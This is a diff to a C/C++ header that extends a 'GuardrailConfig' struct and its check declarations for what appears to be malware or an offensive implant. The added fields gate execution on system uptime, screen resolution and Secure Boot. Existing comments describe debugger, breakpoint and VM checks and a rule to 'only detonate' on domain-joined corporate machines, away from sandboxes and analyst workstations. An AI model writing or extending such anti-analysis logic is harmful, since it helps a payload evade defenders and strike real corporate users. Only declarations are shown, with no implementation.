@@ -54,6 +54,20 @@ struct GuardrailConfig {
     // Anti-sandbox/VM checks
     bool check_sandbox_environment;      // Check for VM/sandbox indicators
 
+    // Uptime check: refuse to run if system uptime is below the threshold.
+    // Fresh sandboxes almost always have near-zero uptime; a real user workstation
+    // has been running for hours. Default threshold is 300 seconds (5 minutes).
+    bool check_uptime;
+    DWORD uptime_min_seconds;            // Minimum uptime in seconds (default 300)
+
+    // Screen resolution check: sandboxes and analyst VMs often use low-res
+    // virtual displays (800x600, 1024x768). Require at least 1280x1024.
+    bool check_screen_resolution;
+
+    // Secure Boot check: modern corporate endpoints have Secure Boot enabled.
+    // Sandbox VMs and analyst machines often disable it for flexibility.
+    bool check_secure_boot;
+
     // Domain-join check: only detonate on machines joined to a Windows
     // domain. Cheap (one NetGetJoinInformation call), highly effective
     // against standalone sandboxes and analyst workstations that rarely
@@ -107,6 +121,9 @@ CheckResult CheckDebuggerProcesses();
 CheckResult CheckHardwareBreakpoints();
 CheckResult CheckTimingAnomaly();
 CheckResult CheckSandboxEnvironment();
+CheckResult CheckUptime(DWORD min_seconds);
+CheckResult CheckScreenResolution();
+CheckResult CheckSecureBoot();
 CheckResult CheckDomainJoined();
 CheckResult CheckParentProcess(const char** allowed, int allowed_count);
 CheckResult CheckLocale(const char** allowed, int allowed_count);
